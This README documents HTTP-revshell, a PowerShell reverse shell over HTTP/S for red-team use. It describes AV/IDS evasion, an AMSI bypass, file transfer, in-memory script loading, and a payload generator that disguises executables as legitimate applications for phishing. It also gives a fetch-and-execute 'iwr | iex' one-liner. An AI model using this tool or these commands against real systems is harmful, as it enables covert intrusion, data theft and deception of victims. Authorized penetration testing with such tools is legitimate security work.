# Powershell HTTP/S Reverse Shell

[![Category-tool]]() [![Powershell]]() [![Python]]() [![License]]()

HTTP-revshell is a tool focused on redteam exercises and pentesters. This tool provides a reverse connection through the http/s protocol. It use a covert channel to gain control over the victim machine through web requests and thus evade solutions such as IDS, IPS and AV.

<p align="center"><img width=400 alt="HTTP-revshell" src="https://raw.githubusercontent.com/3v4Si0N/HTTP-revshell/master/images/logo.png"></p>

## Help server.py (unisession server)
Server usage:
```
usage: server.py [-h] [--ssl] [--autocomplete] host port

positional arguments:
  host            Listen Host
  port            Listen Port

optional arguments:
  -h, --help      show this help message and exit
  --ssl           Send traffic over ssl
  --autocomplete  Autocomplete powershell functions
```

## Help Invoke-WebRev.ps1 (client)
Client usage:
```
Import-Module .\Invoke-WebRev.ps1
Invoke-WebRev -ip IP -port PORT [-ssl]
```

## Installation
```shell
git clone https://github.com/3v4Si0N/HTTP-revshell.git
cd HTTP-revshell/
pip3 install -r requirements.txt
```

## Quick start server-multisession.py (multisession server)

```
This server allows multiple connection of clients.
There is a menu with three basic commands: sessions, interact and exit
     - sessions --> show currently active sessions
     - interact --> interacts with a session (Example: interact <session_id>)
     - exit --> close the application
```
**IMPORTANT**: To change the session press *CTRL+d* to exit the current session without closing it.

**IMPORTANT 2**: It's a BETA version, it's not prepared to use in a real Red Team environment.

## Features
 - SSL
 - Proxy Aware
 - Upload files
 - Download files
 - Load powershell scripts through the server
 - Error Control
 - AMSI bypass
 - Multiple sessions [only server-multisession.py]
 - Autocomplete PowerShell functions (optional) [only server.py]
    
## Extra functions usage
### Upload
This function allow you to upload any file to the victim machine.

Usage:
```
upload /src/path/file C:\dest\path\file
```
### Download
This function allow you to download a file to the attacker machine.

Usage:
```
download C:\src\path\file /dst/path/file
```
 ### Loadps1
This function allows you to load from powershell scripts without having to write to the victim's disk, reading the file through legitimate HTTP traffic.

Usage:
```
loadps1 /path/to/the/local/server/PowershellScript.ps1
```

## Help Revshell-Generator.ps1 (Automatic Payload Generator)
This script allows you to create an executable file with the payload necessary to use **HTTP-revshell**, you just need to follow the instructions on the screen to generate it. There are 6 predefined templates and a customizable one, with the data that you like.

The payloads generated by the tool, incorporate the legitimate icon of the application, as well as the product and copyright information of the original application. In addition, each of them opens the original application before establishing the connection with the server, pretending to be a legitimate application. This can be used for phishing or Red Team exercises.

Payload Generator usage:
```
powershell -ep bypass "iwr -useb https://raw.githubusercontent.com/3v4Si0N/HTTP-revshell/master/Revshell-Generator.ps1 | iex"
```
![Revshell-Generator](/images/generator.gif)

**IMPORTANT**: All fields in predefined templates are auto-complete by pressing the enter key.

## Credits
 - [JoelGMSec] for his awesome Revshell-Generator.ps1. Twitter: [@JoelGMSec]
 - [dev-2null] for report the first bug. Twitter: [@dev2null]

## Disclaimer & License
This script is licensed under LGPLv3+. Direct link to [License](https://raw.githubusercontent.com/3v4Si0N/HTTP-revshell/master/LICENSE).

HTTP-revshell should be used for authorized penetration testing and/or nonprofit educational purposes only. 
Any misuse of this software will not be the responsibility of the author or of any other collaborator. 
Use it at your own servers and/or with the server owner's permission.

<!-- Twitter URLs -->
[@JoelGMSec]: https://twitter.com/JoelGMSec
[@dev2null]: https://twitter.com/dev2nulI

<!-- Github URLs -->
[JoelGMSec]: https://github.com/JoelGMSec
[dev-2null]: https://github.com/dev-2null

<!-- Badge URLs -->
[License]: https://img.shields.io/badge/License-LGPL%20v3%2B-blue.svg?style=flat-square&colorA=273134&colorB=006bbd "LGPL v3+"
[Category-tool]: https://img.shields.io/badge/Category-Post%20Exploitation-E5A505?style=flat-square&colorA=273134
[Powershell]: https://img.shields.io/badge/Powershell-3.0%2B-blue.svg?style=flat-square&colorA=273133&colorB=ff0000
[Python]: https://img.shields.io/badge/Python-3%2B-blue.svg?style=flat-square&colorA=273133&colorB=ff6f00
